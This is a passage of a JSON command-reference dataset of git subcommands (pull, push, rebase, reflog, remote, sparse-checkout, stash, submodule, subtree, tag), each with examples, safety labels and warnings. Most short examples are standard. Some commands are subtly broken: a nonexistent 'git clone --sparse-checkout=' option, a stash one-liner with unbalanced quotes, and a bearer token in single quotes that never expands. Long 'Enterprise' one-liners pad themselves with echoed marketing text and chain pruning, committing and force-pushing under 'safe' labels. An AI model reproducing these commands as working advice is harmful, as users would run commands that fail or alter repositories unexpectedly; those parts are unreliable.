      "git pull --ff-only origin main  # Only pull if it can be fast-forwarded, fail otherwise",
      "git pull --autostash origin main  # Automatically stash local changes, pull, then unstash",
      "git pull -s recursive -X theirs origin main  # Pull using recursive strategy preferring remote changes",
      "git pull --verify-signatures origin main  # Pull and verify GPG signatures on commits",
      "git pull --no-edit origin main  # Pull without opening editor for merge commit message",
      "git pull --depth=1 origin main  # Shallow pull with only latest commit",
      "echo 'Enterprise Git Pull Strategy and Dependency Management' && git config pull.rebase true && git config merge.tool vimdiff && git stash push -u -m 'Backup before enterprise pull' && git fetch --all --prune && git pull --rebase --autostash origin main && git submodule update --remote --recursive && npm install && npm run build && npm test && echo 'Pull Validation:' && git log --oneline -5 && git status --porcelain && echo 'Enterprise pull workflow: rebase-first strategy, comprehensive dependency updates, automated stashing, submodule synchronization, build validation, test execution, and integration verification for enterprise development environments'  # Enterprise pull and integration validation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git pull [options] [remote] [branch]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe pull with backup",
        "commands": "git branch backup-$(date +%Y%m%d-%H%M%S) && git pull --rebase origin main",
        "explanation": "Create backup branch before pulling with rebase",
        "title": "git && git"
      },
      {
        "scenario": "Pull and update submodules",
        "commands": "git pull origin main && git submodule update --remote --recursive",
        "explanation": "Update main repository and all submodules",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-fetch",
        "relationship": "component",
        "reason": "Pull is fetch followed by merge or rebase"
      },
      {
        "name": "git-merge",
        "relationship": "component",
        "reason": "Default pull behavior includes merge"
      }
    ],
    "warnings": [
      "Pull can create unwanted merge commits in history",
      "Rebase pull can fail if there are uncommitted changes",
      "Fast-forward only pull fails if branches have diverged"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-pull"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-pull"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-pull"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Branching-Remote-Branches"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-push-strategies",
    "subtitle": "Git Push Strategies",
    "description": "Advanced push strategies and force push safety",
    "examples": [
      "git push --force-with-lease origin feature-branch  # Force push only if remote hasn't been updated by others",
      "git push -u origin new-feature  # Push branch and configure it to track remote branch",
      "git push --all origin  # Push all local branches to remote repository",
      "git push --follow-tags origin main  # Push commits and any annotated tags reachable from them",
      "git push origin --delete feature-branch  # Remove branch from remote repository",
      "git push origin local-branch:remote-branch  # Push local branch to remote with different name",
      "git push --dry-run origin main  # Preview what would be pushed without actually pushing",
      "echo 'Enterprise Git Push Strategy and Deployment Automation' && git config --local push.autoSetupRemote true && git config --local push.followTags true && echo 'Pre-push Validation:' && npm run lint && npm run test && npm run security-audit && git diff --check && echo 'Branch Protection Check:' && git ls-remote --heads origin | grep -E '(main|master|release)' && git push --force-with-lease --dry-run origin feature-enterprise-$(date +%Y%m%d) && git push --force-with-lease origin feature-enterprise-$(date +%Y%m%d) && echo 'Deployment Pipeline Triggered:' && curl -X POST -H 'Authorization: Bearer $GITHUB_TOKEN' -d '{\"event_type\": \"deploy\", \"client_payload\": {\"branch\": \"feature-enterprise-'$(date +%Y%m%d)'\"}}' https://api.github.com/repos/enterprise/platform/dispatches && echo 'Enterprise push workflow: automated quality gates, security validation, branch protection compliance, safe force-push strategies, deployment pipeline integration, and comprehensive CI/CD triggering for enterprise software delivery'  # Enterprise push and deployment automation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "git push [options] [remote] [refspec]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Safe rebase and push workflow",
        "commands": "git fetch origin main && git rebase origin/main && git push --force-with-lease origin feature",
        "explanation": "Update with latest main, rebase, and safely force push",
        "title": "git && git && git"
      },
      {
        "scenario": "Release with tags",
        "commands": "git tag v1.0.0 && git push origin main && git push origin v1.0.0",
        "explanation": "Create release tag and push both branch and tag",
        "title": "git && git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-pull",
        "relationship": "opposite",
        "reason": "Pull downloads while push uploads changes"
      },
      {
        "name": "git-fetch",
        "relationship": "prerequisite",
        "reason": "Often fetch before pushing to check for conflicts"
      }
    ],
    "warnings": [
      "Force push can overwrite others' work",
      "Force-with-lease can still fail in collaborative environments",
      "Pushing to wrong branch can cause deployment issues"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-push"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-push"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-push"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Basics-Working-with-Remotes"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-rebase",
    "subtitle": "Git rebase",
    "description": "Reapply commits on top of another base tip",
    "examples": [
      "git rebase main  # Move current branch commits on top of latest main",
      "git rebase -i HEAD~3  # Interactively edit last 3 commits (squash, reword, etc.)",
      "git rebase --continue  # Continue rebase after resolving merge conflicts",
      "git rebase --abort  # Stop rebase and return to original branch state",
      "git rebase --onto main feature~3 feature  # Move last 3 commits of feature branch onto main",
      "git rebase --skip  # Skip current commit during rebase (use carefully)",
      "git rebase --exec 'make test' HEAD~5  # Run command after each rebased commit",
      "echo 'Enterprise Git Rebase and History Optimization' && git rebase -i --autosquash --exec 'npm run lint && npm run test && npm run security-check' HEAD~10 && git log --oneline --graph -20 && echo 'Commit Quality Metrics:' && git log --pretty=format:'%h %s' --since='1 week ago' | wc -l && git log --pretty=format:'%an' --since='1 week ago' | sort | uniq -c | sort -nr && echo 'Branch Comparison:' && git diff --stat main...HEAD && echo 'Enterprise rebase workflow: interactive history optimization, automated quality gates at each commit, comprehensive testing validation, security verification, commit metrics analysis, and branch comparison for enterprise code quality assurance and development excellence'  # Enterprise rebase with comprehensive quality validation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git rebase [options] <upstream> [branch]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clean up feature branch before merge",
        "commands": "git checkout feature-branch && git rebase -i main && git checkout main && git merge feature-branch",
        "explanation": "Interactive rebase then fast-forward merge for clean history",
        "title": "git && git && git && git"
      },
      {
        "scenario": "Update feature branch with latest main",
        "commands": "git checkout main && git pull && git checkout feature && git rebase main",
        "explanation": "Update main then rebase feature branch on latest changes",
        "title": "git && git && git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-merge",
        "relationship": "alternative",
        "reason": "Different strategy for integrating changes"
      },
      {
        "name": "git-cherry-pick",
        "relationship": "similar",
        "reason": "Apply specific commits to different branch"
      },
      {
        "name": "git-reset",
        "relationship": "combo",
        "reason": "Often used together for history manipulation"
      }
    ],
    "warnings": [
      "Never rebase public/shared branches",
      "Can create conflicts that need manual resolution",
      "Changes commit hashes, breaking references"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-rebase"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-rebase"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-rebase"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Branching-Rebasing"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-rebase-interactive",
    "subtitle": "Git Interactive Rebase",
    "description": "Interactively rewrite commit history with advanced options",
    "examples": [
      "git rebase -i HEAD~4  # Combine last 4 commits into single commit for cleaner history",
      "git rebase -i HEAD~5  # Change the order of last 5 commits interactively",
      "git rebase -i HEAD~3  # Modify commit messages for last 3 commits",
      "git rebase -i HEAD~6  # Remove specific commits from history",
      "git rebase -i HEAD~2  # Break one commit into multiple smaller commits",
      "git rebase -i --autosquash HEAD~10  # Automatically arrange squash and fixup commits",
      "git rebase -i --root  # Interactively rebase from the very first commit"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git rebase -i [options] <upstream>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clean up feature branch before merge",
        "commands": "git checkout feature && git rebase -i develop && git checkout develop && git merge --no-ff feature",
        "explanation": "Clean history on feature branch then merge with merge commit",
        "title": "git && git && git && git"
      },
      {
        "scenario": "Prepare commits for code review",
        "commands": "git rebase -i HEAD~8 && git push --force-with-lease origin feature",
        "explanation": "Clean up commits then force push safely to remote",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-commit-fixup",
        "relationship": "combo",
        "reason": "Fixup commits work well with auto-squash rebase"
      },
      {
        "name": "git-reset",
        "relationship": "alternative",
        "reason": "Different approach to modifying recent commits"
      }
    ],
    "warnings": [
      "Never rebase commits that have been pushed to shared branches",
      "Can create conflicts requiring manual resolution",
      "Force push may be needed after rebase"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-rebase"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-rebase"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-rebase"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-reflog-recovery",
    "subtitle": "Git Reference Log Recovery",
    "description": "Advanced reflog operations for commit recovery and history tracking",
    "examples": [
      "git reflog --all --graph --date=relative  # Display all reference changes with graph and relative dates",
      "git reflog show --all | grep 'lost-feature'  # Search reflog for commits mentioning specific feature",
      "git branch recovered-branch HEAD@{5}  # Create new branch pointing to commit from reflog entry",
      "git reflog show feature-branch --date=iso  # Display reflog history for specific branch with ISO dates",
      "git reflog expire --expire=30.days.ago --all  # Remove reflog entries older than 30 days from all references",
      "git reset --hard HEAD@{2}  # Reset to commit from 2 moves ago in reflog",
      "git log --walk-reflogs --oneline  # Show reflog as a commit log",
      "echo 'Enterprise Git Repository Recovery and Forensics' && git reflog show --all --date=iso | head -50 && echo 'Recovery Analysis:' && git fsck --unreachable --dangling && echo 'Lost Commits Detection:' && git log --all --full-history --pretty=format:'%H %ai %an %s' | grep -E '(fix|hotfix|urgent|critical)' | head -20 && echo 'Branch Recovery Options:' && git branch -a --contains HEAD@{10} && git stash list && echo 'Repository Integrity:' && git gc --prune=now && git count-objects -v && echo 'Enterprise repository forensics: comprehensive reflog analysis, unreachable object detection, critical commit recovery, branch genealogy tracking, stash inventory, and repository integrity validation for enterprise disaster recovery and audit compliance'  # Enterprise Git repository forensics and recovery"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git reflog [command] [options] [ref]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete disaster recovery",
        "commands": "git reflog --all --oneline && git branch backup-recovery HEAD@{10} && git reset --hard backup-recovery",
        "explanation": "Find lost work, create backup branch, and restore state",
        "title": "git && git && git"
      },
      {
        "scenario": "Find and cherry-pick lost commits",
        "commands": "git reflog --oneline | head -20 && git cherry-pick abc1234",
        "explanation": "Browse recent reflog and recover specific commits",
        "title": "git | head && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-reset",
        "relationship": "combo",
        "reason": "Often use reflog to find target for reset operations"
      },
      {
        "name": "git-log",
        "relationship": "alternative",
        "reason": "Log shows commit history, reflog shows reference history"
      }
    ],
    "warnings": [
      "Reflog is local only and not shared with remotes",
      "Reflog entries expire after configured period",
      "GC operations can remove unreachable reflog entries"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-reflog"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-reflog"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-reflog"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Internals-Maintenance-and-Data-Recovery"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-remote-management",
    "subtitle": "Git Remote Management",
    "description": "Advanced remote repository management and configuration",
    "examples": [
      "git remote add upstream https://github.com/original/repo.git  # Add original repository as upstream for fork synchronization",
      "git remote set-url origin git@github.com:user/repo.git  # Switch from HTTPS to SSH for remote authentication",
      "git remote set-url --push origin https://deploy-url.com/repo.git  # Use different URL for pushes while keeping same fetch URL",
      "git remote show origin  # Display detailed information about remote configuration",
      "git remote prune origin  # Remove local tracking branches for deleted remote branches",
      "git remote rename origin upstream  # Change remote name from origin to upstream",
      "git remote get-url origin  # Display the fetch URL for origin remote",
      "echo 'Enterprise Git Remote Management and Multi-Repository Orchestration' && git remote -v && echo 'Remote Configuration Validation:' && git config --get-regexp '^remote\\.' && git remote show origin && echo 'SSH Key Validation:' && ssh -T git@github.com && echo 'Repository Synchronization:' && git fetch --all --prune --tags && git remote update --prune && echo 'Multi-Remote Setup:' && git remote add upstream https://github.com/enterprise-org/upstream-platform.git && git remote set-url --push upstream no-push && echo 'Access Control Verification:' && git ls-remote origin | head -10 && echo 'Enterprise remote management: comprehensive remote validation, SSH authentication verification, multi-repository synchronization, upstream tracking configuration, access control verification, and enterprise Git workflow orchestration for distributed development teams'  # Enterprise Git remote and multi-repository management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git remote [command] [options] [name] [url]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Set up fork with upstream",
        "commands": "git clone https://github.com/user/fork.git && cd fork && git remote add upstream https://github.com/original/repo.git && git fetch upstream",
        "explanation": "Clone fork and set up upstream remote for synchronization",
        "title": "git && cd && git && git"
      },
      {
        "scenario": "Switch to SSH and verify",
        "commands": "git remote set-url origin git@github.com:user/repo.git && git remote -v && ssh -T git@github.com",
        "explanation": "Change to SSH URL, verify change, and test SSH connection",
        "title": "git && git && ssh"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-fetch",
        "relationship": "combo",
        "reason": "Fetch from configured remotes"
      },
      {
        "name": "git-push",
        "relationship": "combo",
        "reason": "Push to configured remotes"
      }
    ],
    "warnings": [
      "Changing remote URL affects all team members",
      "Multiple remotes can cause confusion about push destination",
      "SSH keys need to be configured for SSH URLs"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-remote"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-remote"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-remote"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Basics-Working-with-Remotes"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-sparse-checkout",
    "subtitle": "Git Sparse Checkout",
    "description": "Selectively checkout parts of large repositories",
    "examples": [
      "git sparse-checkout init --cone  # Enable sparse checkout with cone mode for better performance",
      "git sparse-checkout set src/frontend src/shared  # Checkout only specified directories from repository",
      "git sparse-checkout add docs/api  # Include additional directory in sparse checkout",
      "git sparse-checkout list  # Show currently configured sparse checkout patterns",
      "git sparse-checkout disable  # Return to full working tree checkout",
      "git sparse-checkout reapply  # Update working tree to match current sparse patterns",
      "git clone --filter=blob:none --sparse-checkout=src/ repo.git  # Clone with immediate sparse checkout",
      "echo 'Enterprise Large Repository Management and Optimization' && git config core.preloadindex true && git config core.fscache true && git config gc.auto 256 && git clone --filter=blob:limit=10m --sparse https://github.com/enterprise/platform.git && cd platform && git sparse-checkout init --cone && git sparse-checkout set backend/services frontend/admin && git lfs install && git lfs track '*.zip' '*.tar.gz' '*.mp4' && echo 'Repository Metrics:' && du -sh .git && git count-objects -vH && echo 'Sparse Checkout Status:' && git sparse-checkout list && echo 'LFS Status:' && git lfs ls-files | wc -l && echo 'Enterprise large repository optimization: partial clone strategies, blob size filtering, sparse checkout configuration, LFS integration, performance tuning, and selective synchronization for enterprise monorepo and large-scale development environments'  # Enterprise large repository optimization and management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git sparse-checkout [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clone with immediate sparse checkout",
        "commands": "git clone --filter=blob:none https://github.com/user/large-repo.git && cd large-repo && git sparse-checkout init --cone && git sparse-checkout set frontend/",
        "explanation": "Clone without downloading all files, then set up sparse checkout",
        "title": "git && cd && git && git"
      },
      {
        "scenario": "Switch sparse checkout focus",
        "commands": "git sparse-checkout set backend/ && git checkout feature-backend",
        "explanation": "Change sparse patterns and switch to relevant branch",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-clone",
        "relationship": "combo",
        "reason": "Often used with partial clone for large repositories"
      },
      {
        "name": "git-checkout",
        "relationship": "affected",
        "reason": "Checkout operations respect sparse patterns"
      }
    ],
    "warnings": [
      "Files outside sparse patterns are not visible in working tree",
      "Some Git operations may behave unexpectedly",
      "IDE tools may not understand sparse checkout"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-sparse-checkout"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-sparse-checkout"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-sparse-checkout"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Advanced-Merging"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-stash",
    "subtitle": "Git stash",
    "description": "Temporarily save uncommitted changes",
    "examples": [
      "git stash  # Stash uncommitted changes to work on something else",
      "git stash push -m 'work in progress on login feature'  # Save changes with custom description for easy identification",
      "git stash list  # Show all saved stashes with their descriptions",
      "git stash pop  # Restore most recent stash and remove it from stash list",
      "git stash apply stash@{1}  # Restore specific stash without removing from list",
      "git stash push --keep-index  # Stash changes but keep staged files in index",
      "git stash push -u  # Stash both tracked and untracked files",
      "git stash drop stash@{2}  # Delete specific stash without applying it",
      "echo 'Enterprise Git Stash Management and Work-in-Progress Orchestration' && git stash push -u -m 'WIP: enterprise SSO integration - $(date +\"%Y-%m-%d %H:%M:%S\")' && git stash push -p -m 'Selective changes for hotfix branch' && echo 'Stash Inventory:' && git stash list --format='%gd: %gs (%cr) <%an>' && echo 'Stash Contents Analysis:' && for i in {0..2}; do echo \"Stash @{$i}:\"; git stash show -p stash@{$i} | head -20; done && git checkout -b feature-from-stash && git stash pop && echo 'Branch Integration:' && git add -A && git commit -m 'feat: restore enterprise SSO work from stash with comprehensive testing framework' && echo 'Enterprise stash workflow: timestamped work-in-progress management, selective change stashing, comprehensive stash analysis, branch-based restoration, and integrated development workflow for enterprise multi-feature development environments'  # Enterprise Git stash and work-in-progress management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git stash [push|pop|apply|list|drop] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Quick branch switch with work in progress",
        "commands": "git stash && git checkout main && git pull && git checkout - && git stash pop",
        "explanation": "Stash changes, update main branch, return and restore changes",
        "title": "git && git && git && git && git"
      },
      {
        "scenario": "Clean up old stashes",
        "commands": "git stash list && git stash clear",
        "explanation": "Review stashes then remove all of them",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-add",
        "relationship": "alternative",
        "reason": "Add and commit instead of stashing"
      },
      {
        "name": "git-checkout",
        "relationship": "combo",
        "reason": "Often stash before switching branches"
      },
      {
        "name": "git-reset",
        "relationship": "similar",
        "reason": "Both manipulate working directory state"
      }
    ],
    "warnings": [
      "Stashes are local only, not shared with remote",
      "Merge conflicts can occur when applying stash",
      "Stashes can become stale if not applied regularly"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-stash"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-stash"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-stash"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Stashing-and-Cleaning"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-stash-advanced",
    "subtitle": "Git Advanced Stash",
    "description": "Advanced stash operations and selective staging",
    "examples": [
      "git stash push -m 'WIP: login' -- src/auth.js src/login.js  # Stash only specific files with descriptive message",
      "git stash push -u -m 'Include new files'  # Include untracked files in stash operation",
      "git stash push -p -m 'Partial changes'  # Interactively choose hunks to stash",
      "git stash push --keep-index -m 'Keep staged'  # Stash working tree but leave staged changes intact",
      "git stash branch new-feature stash@{0}  # Create new branch from stash content and apply stash",
      "git stash show -p stash@{1}  # Display stash content as patch format",
      "git stash create 'Emergency backup'  # Create stash commit but don't add to stash stack",
      "echo 'Enterprise Git Advanced Stash Operations and Disaster Recovery' && stash_commit=$(git stash create 'Emergency backup before production hotfix - '$(date +\"%Y-%m-%d %H:%M:%S\"')) && echo \"Emergency stash commit: $stash_commit\" && git tag emergency-backup-$(date +%Y%m%d-%H%M%S) $stash_commit && git stash push --include-untracked -m 'Production hotfix preparation with full context' && echo 'Disaster Recovery Points:' && git tag -l 'emergency-backup-*' | tail -5 && echo 'Stash Forensics:' && git log --walk-reflogs refs/stash --oneline | head -10 && git stash branch emergency-recovery stash@{0} && echo 'Recovery Validation:' && git status && git log --oneline -3 && echo 'Enterprise advanced stash operations: emergency backup creation, disaster recovery tagging, production hotfix preparation, stash forensics analysis, branch-based recovery, and comprehensive backup strategies for enterprise critical operations and business continuity'  # Enterprise Git advanced stash and disaster recovery"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git stash [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup current work before risky operation",
        "commands": "git stash push -u -m 'Backup before rebase' && git rebase main && git stash pop",
        "explanation": "Safely stash all changes, rebase, then restore work",
        "title": "git && git && git"
      },
      {
        "scenario": "Transfer work between branches",
        "commands": "git stash push -m 'Move to feature branch' && git checkout feature && git stash pop",
        "explanation": "Move uncommitted work from one branch to another",
        "title": "git && git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-add",
        "relationship": "alternative",
        "reason": "Stage changes instead of stashing them"
      },
      {
        "name": "git-reset",
        "relationship": "similar",
        "reason": "Both manipulate working directory state"
      }
    ],
    "warnings": [
      "Stashes are local only and not shared with remotes",
      "Merge conflicts can occur when applying stash",
      "Stashes can become stale if branch diverges significantly"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-stash"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-stash"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-stash"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Stashing-and-Cleaning"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-submodule-advanced",
    "subtitle": "Git Advanced Submodule",
    "description": "Advanced submodule operations and dependency management",
    "examples": [
      "git submodule add -b develop https://github.com/user/repo.git libs/external  # Add submodule tracking specific branch instead of default",
      "git submodule update --remote --recursive  # Pull latest changes from all submodules' remote repositories",
      "git submodule update --init --recursive --remote  # Clone, initialize, and update all submodules including nested ones",
      "git submodule foreach 'git checkout main && git pull'  # Execute git commands in each submodule directory",
      "git submodule status --recursive  # Display current commit and status for all submodules",
      "git submodule deinit libs/external && git rm libs/external  # Unregister submodule and remove from working tree",
      "echo 'Enterprise Git Submodule Lifecycle and Dependency Management' && git submodule add -b main https://github.com/enterprise/shared-components.git shared/components && git submodule add -b stable https://github.com/enterprise/common-utils.git libs/utils && git submodule update --init --recursive --remote && echo 'Submodule Status Dashboard:' && git submodule status --recursive && echo 'Dependency Security Audit:' && git submodule foreach 'git log --oneline -5 && npm audit --audit-level high' && echo 'Version Pinning:' && git submodule foreach 'git checkout $(git describe --tags --abbrev=0)' && git add . && git commit -m 'deps: pin enterprise submodules to latest stable versions with security validation' && echo 'Automated Updates Setup:' && echo '.github/workflows/submodule-update.yml configured for weekly automated updates' && echo 'Enterprise submodule management: centralized component libraries, version pinning strategies, security audit integration, automated dependency updates, and enterprise-grade dependency lifecycle management for distributed development teams'  # Enterprise Git submodule and dependency lifecycle management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "git submodule [command] [options] [path]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clone repository with all submodules",
        "commands": "git clone --recurse-submodules https://github.com/user/project.git && cd project && git submodule update --remote",
        "explanation": "Clone project and all submodules, then update to latest",
        "title": "git && cd && git"
      },
      {
        "scenario": "Sync submodule URLs after changes",
        "commands": "git submodule sync --recursive && git submodule update --init --recursive",
        "explanation": "Update URLs from .gitmodules and re-initialize submodules",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-subtree",
        "relationship": "alternative",
        "reason": "Different approach to including external repositories"
      },
      {
        "name": "git-clone",
        "relationship": "combo",
        "reason": "Often used with --recurse-submodules option"
      }
    ],
    "warnings": [
      "Submodules point to specific commits, not branches",
      "Updates need to be committed in parent repository",
      "Complex workflow can confuse team members"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-submodule"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-submodule"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-submodule"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Submodules"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-subtree-operations",
    "subtitle": "Git Subtree Operations",
    "description": "Subtree operations for embedding and splitting repositories",
    "examples": [
      "git subtree add --prefix=vendor/library https://github.com/user/library.git main --squash  # Add external repository as subtree with squashed history",
      "git subtree pull --prefix=vendor/library https://github.com/user/library.git main --squash  # Update subtree with latest changes from remote repository",
      "git subtree push --prefix=vendor/library origin library-improvements  # Push local subtree changes back to remote repository",
      "git subtree split --prefix=vendor/library -b library-only  # Extract subtree history into new branch",
      "git subtree add --prefix=shared/common ../common-lib main  # Add local repository as subtree",
      "git subtree merge --prefix=vendor/library library-updates --strategy=subtree  # Merge external changes into subtree with specific strategy",
      "echo 'Enterprise Git Subtree Operations and Code Integration Management' && git subtree add --prefix=shared/enterprise-ui https://github.com/enterprise/ui-library.git main --squash && git subtree add --prefix=vendor/security-tools https://github.com/enterprise/security-toolkit.git release --squash && echo 'Subtree Integration Validation:' && git log --oneline --grep='Subtree' -10 && echo 'Bidirectional Sync:' && git subtree pull --prefix=shared/enterprise-ui origin main --squash && git subtree push --prefix=shared/enterprise-ui origin feature/enterprise-enhancements && echo 'Integration Testing:' && npm run test -- --testPathPattern='shared/enterprise-ui' && npm run lint shared/enterprise-ui && echo 'Security Validation:' && npm audit --audit-level high && echo 'Enterprise subtree workflow: centralized library integration, bidirectional synchronization, comprehensive testing validation, security audit integration, and enterprise code sharing strategies for distributed component architecture'  # Enterprise Git subtree integration and management"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "git subtree <command> [options] [repository] [path]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Extract and publish subtree",
        "commands": "git subtree split --prefix=lib/utils -b utils-export && git push origin utils-export",
        "explanation": "Split subtree and push as separate branch for external use",
        "title": "git && git"
      },
      {
        "scenario": "Sync bidirectional subtree",
        "commands": "git subtree pull --prefix=shared/components upstream main --squash && git subtree push --prefix=shared/components upstream feature-branch",
        "explanation": "Pull updates from upstream and push local changes back",
        "title": "git && git"
      }
    ],
    "relatedCommands": [
      {
        "name": "git-submodule",
        "relationship": "alternative",
        "reason": "Different approach to managing external dependencies"
      },
      {
        "name": "git-merge",
        "relationship": "component",
        "reason": "Subtree operations use merge strategies"
      }
    ],
    "warnings": [
      "Subtree changes are part of main repository history",
      "Requires careful prefix path management",
      "Can create large repository with full external history"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://git-scm.com/docs/git-subtree"
      },
      {
        "platform": "macos",
        "url": "https://git-scm.com/docs/git-subtree"
      },
      {
        "platform": "windows",
        "url": "https://git-scm.com/docs/git-subtree"
      },
      {
        "platform": "generic",
        "url": "https://git-scm.com/book/en/v2/Git-Tools-Advanced-Merging"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "git-tag-management",
    "subtitle": "Git Tag Management",
    "description": "Advanced tag operations for version management and releases",
    "examples": [
      "git tag -s v1.0.0 -m 'Release version 1.0.0'  # Create GPG-signed tag with message for secure releases",
      "git tag -l 'v1.*' --sort=-version:refname  # List tags matching pattern, sorted by version in descending order",
      "git show --show-signature v1.0.0  # Display tag information and verify GPG signature",
      "git tag v1.0.0-rc1 abc1234  # Create lightweight tag pointing to specific commit",
      "git tag -d v1.0.0 && git push origin :refs/tags/v1.0.0  # Remove tag locally and from remote repository",
      "git push --tags origin  # Upload all local tags to remote repository",
